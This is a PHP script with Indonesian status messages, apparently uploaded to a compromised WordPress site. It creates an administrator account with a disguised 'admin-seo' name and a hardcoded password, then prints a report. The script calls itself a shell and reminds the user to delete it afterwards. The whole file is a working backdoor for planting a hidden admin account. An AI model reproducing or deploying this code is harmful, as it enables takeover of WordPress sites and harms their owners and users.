<?php
$total = 1;
$base_username = 'admin-seo'; 
$default_password = 'susah@banget1337';
$default_email = 'admin@wordpress.com'; 

require_once('wp-load.php');

if (!defined('ABSPATH')) {
    die('<h1 style="color: red; font-family: sans-serif;">Error: Gak Bisa Bre</h1>');
}

set_time_limit(30); 

$count_success = 0;
$count_failed = 0;
$count_exists = 0;

echo '<h1 style="color: blue; font-family: sans-serif;">PROSES PEMBUATAN ADMIN DIMULAI (DEBUG MODE)...</h1>';
echo '<hr>';

for ($i = 1; $i <= $total; $i++) {
    $current_username = $base_username . $i;
    $current_password = $default_password; 
    $current_email    = 'user' . $i . '@' . $default_email;

    if (username_exists($current_username)) {
        $count_exists++;
        echo "<p style='color:orange;'>[{$i}/{$total}] Sudah Ada: User {$current_username}.</p>";
        continue;
    }

    $user_id = wp_create_user(
        $current_username,
        $current_password,
        $current_email
    );

    if (is_wp_error($user_id)) {
        $count_failed++;
        echo "<p style='color:red;'>[{$i}/{$total}] GAGAL: {$current_username}. Error: " . $user_id->get_error_message() . "</p>";
    } else {
        $user = new WP_User($user_id);
        $user->set_role('administrator');
        $count_success++;
        echo "<p style='color:green;'>[{$i}/{$total}] SUKSES: Dibuat {$current_username}.</p>";
    }
    ob_flush();
    flush();
}

echo '<hr>';
echo '<h1 style="color: purple; font-family: sans-serif;">LAPORAN AKHIR</h1>';
echo '<ul style="font-family: sans-serif;">';
echo '<li><strong>Total User Dibuat:</strong> <span style="color:green;">' . $count_success . '</span></li>';
echo '<li><strong>User Sudah Ada:</strong> <span style="color:orange;">' . $count_exists . '</span></li>';
echo '<li><strong>User Gagal Dibuat:</strong> <span style="color:red;">' . $count_failed . '</span></li>';
echo '<li><strong>Password Default:</strong> ' . htmlspecialchars($default_password) . '</li>';
echo '</ul>';
echo '<h2 style="color: red; font-family: sans-serif;">JANGAN LUPA HAPUS SHELL INI</h2>';

?>
